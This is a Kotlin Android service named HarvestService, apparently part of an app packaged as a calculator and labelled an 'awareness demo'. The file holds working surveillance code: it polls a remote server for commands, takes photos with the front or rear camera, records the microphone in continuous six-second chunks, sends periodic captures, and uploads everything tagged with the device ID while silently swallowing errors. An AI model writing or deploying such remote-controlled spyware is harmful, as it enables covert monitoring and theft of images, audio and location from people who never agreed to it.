package com.awareness.calc

import android.Manifest
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.content.pm.ServiceInfo
import android.hardware.camera2.CameraMetadata
import android.media.MediaRecorder
import android.os.Build
import android.os.Handler
import android.os.HandlerThread
import android.os.IBinder
import android.os.Looper
import android.provider.Settings
import androidx.camera.core.CameraSelector
import androidx.camera.core.ImageCapture
import androidx.camera.core.ImageCaptureException
import androidx.camera.core.ImageProxy
import androidx.camera.lifecycle.ProcessCameraProvider
import androidx.core.app.NotificationCompat
import androidx.core.app.ServiceCompat
import androidx.core.content.ContextCompat
import androidx.lifecycle.Lifecycle
import androidx.lifecycle.LifecycleOwner
import androidx.lifecycle.LifecycleRegistry
import org.json.JSONObject
import java.io.File
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL

class HarvestService : Service(), LifecycleOwner {
    private lateinit var lifecycleRegistry: LifecycleRegistry
    private val mainHandler = Handler(Looper.getMainLooper())
    private lateinit var netThread: HandlerThread
    private lateinit var netHandler: Handler
    private var cameraProvider: ProcessCameraProvider? = null
    private var photoBusy = false
    @Volatile private var recordingActive = false
    private var recorder: MediaRecorder? = null
    private var currentChunkFile: File? = null
    private var chunkSeq = 0
    private var chunkCycle: Runnable? = null
    private val baseUrl: String by lazy {
        val u = URL(IngestConfig.URL)
        u.protocol + "://" + u.host
    }

    override val lifecycle: Lifecycle
        get() = lifecycleRegistry

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        lifecycleRegistry = LifecycleRegistry(this)
        lifecycleRegistry.handleLifecycleEvent(Lifecycle.Event.ON_CREATE)
        netThread = HandlerThread("harvest-net")
        netThread.start()
        netHandler = Handler(netThread.looper)
        startForegroundNow()
        mainHandler.post(locationLoop)
        netHandler.postDelayed({ pollLoop() }, 1000)
    }

    private fun startForegroundNow() {
        val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            nm.createNotificationChannel(
                NotificationChannel("awareness", "Awareness", NotificationManager.IMPORTANCE_LOW)
            )
        }
        val notification = NotificationCompat.Builder(this, "awareness")
            .setSmallIcon(R.drawable.ic_stat)
            .setContentTitle("Awareness demo active")
            .setContentText("Location, camera and microphone demo in progress")
            .setOngoing(true)
            .build()
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            ServiceCompat.startForeground(
                this,
                1001,
                notification,
                ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION or
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA or
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
            )
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            ServiceCompat.startForeground(
                this,
                1001,
                notification,
                ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
            )
        } else {
            startForeground(1001, notification)
        }
    }

    private val locationLoop = object : Runnable {
        override fun run() {
            try {
                sendCaptureNow(applicationContext)
            } catch (_: Exception) {
            }
            mainHandler.postDelayed(this, 12000)
        }
    }

    private fun pollLoop() {
        Thread { pollOnce() }.start()
        netHandler.postDelayed({ pollLoop() }, 2000)
    }

    private fun pollOnce() {
        try {
            val deviceId = deviceId()
            val conn = URL("$baseUrl/api/poll?deviceId=$deviceId").openConnection() as HttpURLConnection
            conn.requestMethod = "GET"
            conn.connectTimeout = 8000
            conn.readTimeout = 8000
            conn.setRequestProperty("x-ingest-key", IngestConfig.KEY)
            val text = conn.inputStream.bufferedReader().use { it.readText() }
            conn.inputStream?.close()
            conn.disconnect()
            val obj = JSONObject(text)
            val commands = obj.optJSONArray("commands") ?: return
            for (i in 0 until commands.length()) {
                val c = commands.getJSONObject(i)
                val commandId = c.optString("commandId")
                val type = c.optString("type")
                when (type) {
                    "photo" -> {
                        val lens = if (c.optString("lens") == "front") "front" else "rear"
                        mainHandler.post { capturePhoto(commandId, lens) }
                    }
                    "audio" -> {
                        val action = c.optString("audioAction")
                        if (action == "start") {
                            netHandler.post { handleAudioStart(commandId) }
                        } else if (action == "stop") {
                            netHandler.post {
                                handleAudioStop()
                                postCommandDone(commandId, "done")
                            }
                        }
                    }
                }
            }
        } catch (_: Exception) {
        }
    }

    private fun deviceId(): String =
        Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID) ?: "unknown"

    private fun hasPerm(permission: String): Boolean =
        ContextCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED

    private fun capturePhoto(commandId: String, lens: String) {
        if (!hasPerm(Manifest.permission.CAMERA)) {
            postCommandDone(commandId, "failed")
            return
        }
        if (photoBusy) {
            postCommandDone(commandId, "failed")
            return
        }
        photoBusy = true
        try {
            lifecycleRegistry.handleLifecycleEvent(Lifecycle.Event.ON_START)
            lifecycleRegistry.handleLifecycleEvent(Lifecycle.Event.ON_RESUME)
            val provider = ProcessCameraProvider.getInstance(this).get()
            cameraProvider = provider
            provider.unbindAll()
            val imageCapture = ImageCapture.Builder()
                .setCaptureMode(ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY)
                .build()
            val selector = CameraSelector.Builder()
                .requireLensFacing(
                    if (lens == "front") CameraMetadata.LENS_FACING_FRONT else CameraMetadata.LENS_FACING_BACK
                )
                .build()
            provider.bindToLifecycle(this, selector, imageCapture)
            imageCapture.takePicture(
                ContextCompat.getMainExecutor(this),
                object : ImageCapture.OnImageCapturedCallback() {
                    override fun onCaptureSuccess(image: ImageProxy) {
                        val bytes = try {
                            val buf = image.planes[0].buffer
                            val arr = ByteArray(buf.remaining())
                            buf.get(arr)
                            arr
                        } catch (_: Exception) {
                            null
                        }
                        image.close()
                        try {
                            provider.unbindAll()
                        } catch (_: Exception) {
                        }
                        photoBusy = false
                        if (bytes != null) {
                            Thread { uploadPhoto(commandId, lens, bytes) }.start()
                        } else {
                            postCommandDone(commandId, "failed")
                        }
                    }

                    override fun onError(exception: ImageCaptureException) {
                        try {
                            provider.unbindAll()
                        } catch (_: Exception) {
                        }
                        photoBusy = false
                        postCommandDone(commandId, "failed")
                    }
                }
            )
        } catch (_: Exception) {
            try {
                cameraProvider?.unbindAll()
            } catch (_: Exception) {
            }
            photoBusy = false
            postCommandDone(commandId, "failed")
        }
    }

    private fun uploadPhoto(commandId: String, lens: String, bytes: ByteArray) {
        try {
            val deviceId = deviceId()
            val urlReq = JSONObject().put("deviceId", deviceId)
            val uploadUrl = postJsonForJson("$baseUrl/api/media/url", urlReq).getString("url")
            val storageId = uploadMultipart(uploadUrl, bytes, "image/jpeg", "p.jpg")
            val media = JSONObject()
                .put("deviceId", deviceId)
                .put("kind", "photo")
                .put("lens", lens)
                .put("storageId", storageId)
                .put("mime", "image/jpeg")
                .put("takenAt", System.currentTimeMillis())
            postJson("$baseUrl/api/media", media)
            postCommandDone(commandId, "done")
        } catch (_: Exception) {
            postCommandDone(commandId, "failed")
        }
    }

    private fun handleAudioStart(commandId: String) {
        if (!hasPerm(Manifest.permission.RECORD_AUDIO)) {
            postCommandDone(commandId, "failed")
            return
        }
        if (recordingActive) {
            postCommandDone(commandId, "done")
            return
        }
        recordingActive = true
        chunkSeq = 0
        try {
            startChunk()
            postCommandDone(commandId, "done")
        } catch (_: Exception) {
            recordingActive = false
            try {
                stopRecorder()
            } catch (_: Exception) {
            }
            postCommandDone(commandId, "failed")
            return
        }
        scheduleChunkCycle()
    }

    private fun scheduleChunkCycle() {
        val runnable = object : Runnable {
            override fun run() {
                if (!recordingActive) return
                try {
                    stopRecorder()
                    val file = currentChunkFile
                    currentChunkFile = null
                    if (file != null && file.length() > 0) {
                        val bytes = file.readBytes()
                        val seq = chunkSeq
                        chunkSeq += 1
                        Thread { uploadAudioChunk(seq, bytes) }.start()
                    }
                    file?.delete()
                    startChunk()
                } catch (_: Exception) {
                    try {
                        stopRecorder()
                    } catch (_: Exception) {
                    }
                }
                if (recordingActive) {
                    chunkCycle = this
                    netHandler.postDelayed(this, 6000)
                }
            }
        }
        chunkCycle = runnable
        netHandler.postDelayed(runnable, 6000)
    }

    private fun startChunk() {
        val seq = chunkSeq
        val file = File(cacheDir, "chunk_$seq.m4a")
        if (file.exists()) file.delete()
        val rec = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            MediaRecorder(applicationContext)
        } else {
            @Suppress("DEPRECATION")
            MediaRecorder()
        }
        rec.setAudioSource(MediaRecorder.AudioSource.MIC)
        rec.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
        rec.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
        rec.setAudioEncodingBitRate(96000)
        rec.setAudioSamplingRate(44100)
        rec.setOutputFile(file.absolutePath)
        rec.prepare()
        rec.start()
        recorder = rec
        currentChunkFile = file
    }

    private fun stopRecorder() {
        try {
            recorder?.stop()
        } finally {
            try {
                recorder?.release()
            } catch (_: Exception) {
            }
            recorder = null
        }
    }

    private fun handleAudioStop() {
        chunkCycle?.let { netHandler.removeCallbacks(it) }
        chunkCycle = null
        if (!recordingActive) return
        recordingActive = false
        try {
            stopRecorder()
            currentChunkFile?.delete()
            currentChunkFile = null
        } catch (_: Exception) {
        }
    }

    private fun uploadAudioChunk(seq: Int, bytes: ByteArray) {
        try {
            val deviceId = deviceId()
            val urlReq = JSONObject().put("deviceId", deviceId)
            val uploadUrl = postJsonForJson("$baseUrl/api/media/url", urlReq).getString("url")
            val storageId = uploadMultipart(uploadUrl, bytes, "audio/mp4", "chunk_$seq.m4a")
            val media = JSONObject()
                .put("deviceId", deviceId)
                .put("kind", "audio")
                .put("storageId", storageId)
                .put("mime", "audio/mp4")
                .put("takenAt", System.currentTimeMillis())
                .put("durationMs", 6000)
                .put("seq", seq)
            postJson("$baseUrl/api/media", media)
        } catch (_: Exception) {
        }
    }

    private fun postJson(path: String, body: JSONObject) {
        val conn = URL(path).openConnection() as HttpURLConnection
        conn.requestMethod = "POST"
        conn.connectTimeout = 8000
        conn.readTimeout = 8000
        conn.doOutput = true
        conn.setRequestProperty("Content-Type", "application/json")
        conn.setRequestProperty("x-ingest-key", IngestConfig.KEY)
        OutputStreamWriter(conn.outputStream).use { it.write(body.toString()) }
        conn.responseCode
        conn.inputStream?.close()
        conn.disconnect()
    }

    private fun postJsonForJson(path: String, body: JSONObject): JSONObject {
        val conn = URL(path).openConnection() as HttpURLConnection
        conn.requestMethod = "POST"
        conn.connectTimeout = 8000
        conn.readTimeout = 8000
        conn.doOutput = true
        conn.setRequestProperty("Content-Type", "application/json")
        conn.setRequestProperty("x-ingest-key", IngestConfig.KEY)
        OutputStreamWriter(conn.outputStream).use { it.write(body.toString()) }
        val code = conn.responseCode
        if (code !in 200..299) {
            conn.disconnect()
            throw IllegalStateException("HTTP $code")
        }
        val text = conn.inputStream.bufferedReader().use { it.readText() }
        conn.inputStream?.close()
        conn.disconnect()
        return JSONObject(text)
    }

    private fun uploadMultipart(uploadUrl: String, bytes: ByteArray, mime: String, filename: String): String {
        val boundary = "----awareness" + System.currentTimeMillis()
        val conn = URL(uploadUrl).openConnection() as HttpURLConnection
        conn.requestMethod = "POST"
        conn.connectTimeout = 8000
        conn.readTimeout = 30000
        conn.doOutput = true
        conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=$boundary")
        val head = StringBuilder()
        head.append("--").append(boundary).append("\r\n")
        head.append("Content-Disposition: form-data; name=\"file\"; filename=\"").append(filename).append("\"\r\n")
        head.append("Content-Type: ").append(mime).append("\r\n\r\n")
        val headBytes = head.toString().toByteArray(Charsets.UTF_8)
        val tail = "\r\n--$boundary--\r\n".toByteArray(Charsets.UTF_8)
        conn.setFixedLengthStreamingMode(headBytes.size + bytes.size + tail.size)
        conn.outputStream.use { os ->
            os.write(headBytes)
            os.write(bytes)
            os.write(tail)
            os.flush()
        }
        val code = conn.responseCode
        if (code !in 200..299) {
            conn.disconnect()
            throw IllegalStateException("HTTP $code")
        }
        val text = conn.inputStream.bufferedReader().use { it.readText() }
        conn.inputStream?.close()
        conn.disconnect()
        return JSONObject(text).getString("storageId")
    }

    private fun postCommandDone(commandId: String, status: String) {
        Thread {
            try {
                postJson("$baseUrl/api/command/done", JSONObject().put("commandId", commandId).put("status", status))
            } catch (_: Exception) {
            }
        }.start()
    }

    override fun onDestroy() {
        mainHandler.removeCallbacksAndMessages(null)
        netHandler.removeCallbacksAndMessages(null)
        chunkCycle = null
        recordingActive = false
        try {
            recorder?.stop()
        } catch (_: Exception) {
        }
        try {
            recorder?.release()
        } catch (_: Exception) {
        }
        recorder = null
        currentChunkFile = null
        try {
            cameraProvider?.unbindAll()
        } catch (_: Exception) {
        }
        try {
            lifecycleRegistry.handleLifecycleEvent(Lifecycle.Event.ON_DESTROY)
        } catch (_: Exception) {
        }
        netThread.quitSafely()
        super.onDestroy()
    }
}
